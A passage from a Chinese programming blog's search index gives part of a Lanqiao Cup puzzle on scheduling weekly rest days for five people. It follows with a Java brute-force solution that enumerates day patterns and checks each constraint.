<p>A B C D E 每人占用1行记录，从星期一开始。<br>【输入、输出格式要求】<br>程序没有输入，要求输出所有可能的方案。<br>每个方案是7×5的矩阵。只有1和0组成。<br>矩阵中的列表示星期几，从星期一开始。<br>矩阵的行分别表示A，B，C，D，E的作息时间表。<br>多个矩阵间用空行分隔开。<br>例如，如下的矩阵就是一个合格的解。请编程输出所有解(多个解的前后顺序不重要)。<br>0110111<br>1101110<br>0110111<br>1101110<br>1110110</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 分析：先根据要求一和题目可以得出一下组合然后得出组合</span><br><span class="line"> * 然后再去满足其余的要求</span><br><span class="line"> */</span><br><span class="line">public class T16 &#123;</span><br><span class="line">/* 根据 要求一和题目可以得出一下组合 */</span><br><span class="line">	static String[] strs = new String[] &#123; &quot;1110110&quot;, &quot;1101110&quot;, &quot;1101101&quot;,</span><br><span class="line">					      &quot;1011101&quot;, &quot;1011011&quot;, &quot;0110111&quot;, &quot;0111011&quot; &#125;;</span><br><span class="line">	public static void main( String[] args )</span><br><span class="line">	&#123;</span><br><span class="line">		test();</span><br><span class="line">	&#125;</span><br><span class="line">	public static void test()</span><br><span class="line">	&#123;</span><br><span class="line">		int	k		= 0;</span><br><span class="line">		String	members[]	= new String[5];</span><br><span class="line">		for ( int a = 0; a &lt; 7; a++ )</span><br><span class="line">		&#123;</span><br><span class="line">			for ( int b = 0; b &lt; 7; b++ )</span><br><span class="line">			&#123;</span><br><span class="line">				for ( int c = 0; c &lt; 7; c++ )</span><br><span class="line">				&#123;</span><br><span class="line">					for ( int d = 0; d &lt; 7; d++ )</span><br><span class="line">					&#123;</span><br><span class="line">						for ( int e = 0; e &lt; 7; e++ )</span><br><span class="line">						&#123;</span><br><span class="line">							members[0]	= strs[a];</span><br><span class="line">							members[1]	= strs[b];</span><br><span class="line">							members[2]	= strs[c];</span><br><span class="line">							members[3]	= strs[d];</span><br><span class="line">							members[4]	= strs[e];</span><br><span class="line">							if ( check( members ) )</span><br><span class="line">							&#123;</span><br><span class="line">								k++;</span><br><span class="line">								System.out.println( &quot;第&quot; + k + &quot;种方案:&quot; );</span><br><span class="line">								print( members );</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void print( String members[] )</span><br><span class="line">	&#123;</span><br><span class="line">		for ( int i = 0; i &lt; members.length; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			System.out.print( members[i] );</span><br><span class="line">			System.out.println();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static boolean check( String members[] )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( check2( members ) &amp;&amp; check3( members ) &amp;&amp; check5( members )</span><br><span class="line">		     &amp;&amp; check4( members ) &amp;&amp; check6( members ) )</span><br><span class="line">		&#123;</span><br><span class="line">			return(true);</span><br><span class="line">		&#125;</span><br><span class="line">		return(false);</span><br><span class="line">	&#125;</span><br><span class="line">/* 要求二 */</span><br><span class="line">	public static boolean check2( String members[] )</span><br><span class="line">	&#123;</span><br><span class="line">		int sum = 0;</span><br><span class="line">		for ( int j = 0; j &lt; 7; j++ )</span><br><span class="line">		&#123;</span><br><span class="line">			int count = 0;</span><br><span class="line">			for ( int i = 0; i &lt; members.length; i++ )</span><br><span class="line">			&#123;</span><br><span class="line">				if ( members[i].charAt( j ) == &apos;1&apos; )</span><br><span class="line">				&#123;</span><br><span class="line">					count++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			if ( count == 5 )</span><br><span class="line">			&#123;</span><br><span class="line">				sum++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		if ( sum == 3 )</span><br><span class="line">		&#123;</span><br><span class="line">			return(true);</span><br><span class="line">		&#125;</span><br><span class="line">		return(false);</span><br><span class="line">	&#125;</span><br><span class="line">/* 要求三 */</span><br><span class="line">	public static boolean check3( String members[] )</span><br><span class="line">	&#123;</span><br><span class="line">		for ( int i = 0; i &lt; 7; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			int count = 0;</span><br><span class="line">			for ( int j = 0; j &lt; 4; j++ )</span><br><span class="line">			&#123;</span><br><span class="line">				if ( members[j].charAt( i ) == &apos;1&apos; )</span><br><span class="line">				&#123;</span><br><span class="line">					count++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			if ( count &lt; 2 )</span><br><span class="line">			&#123;</span><br><span class="line">				return(false);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return(true);</span><br><span class="line">	&#125;</span><br><span class="line">/* 要求四 */</span><br><span class="line">	public static boolean check4( String members[] )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( members[1].charAt( 6 ) == &apos;0&apos; &amp;&amp; members[3].charAt( 6 ) == &apos;0&apos;</span><br><span class="line">		     &amp;&amp; members[4].charAt( 6 ) == &apos;0&apos; )</span><br><span class="line">		&#123;</span><br><span class="line">			return(true);</span><br><span class="line">		&#125;</span><br><span class="line">		return(false);</span><br><span class="line">	&#125;</span><br><span class="line">/* 要求五 */</span><br><span class="line">	public static boolean check5( String members[] )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( members[0].charAt( 2 ) == &apos;1&apos; &amp;&amp; members[4].charAt( 2 ) == &apos;1&apos; )</span><br><span class="line">		&#123;</span><br><span class="line">			return(true);</span><br><span class="line">		&#125;</span><br><span class="line">		return(false);</span><br><span class="line">	&#125;</span><br><span class="line">/* 要求六 */</span><br><span class="line">	public static boolean check6( String members[] )</span><br><span class="line">	&#123;</span><br><span class="line">		int count = 0;</span><br><span class="line">		for ( int i = 0; i &lt; 7; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			if ( members[0].charAt( i ) == &apos;1&apos; &amp;&amp; members[2].charAt( i ) == &apos;1&apos; )</span><br><span class="line">			&#123;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		if ( count &gt;= 4 )</span><br><span class="line">		&#123;</span><br><span class="line">			return(true);</span><br><span class="line">		&#125;</span><br><span class="line">		return(false);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 蓝桥杯 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
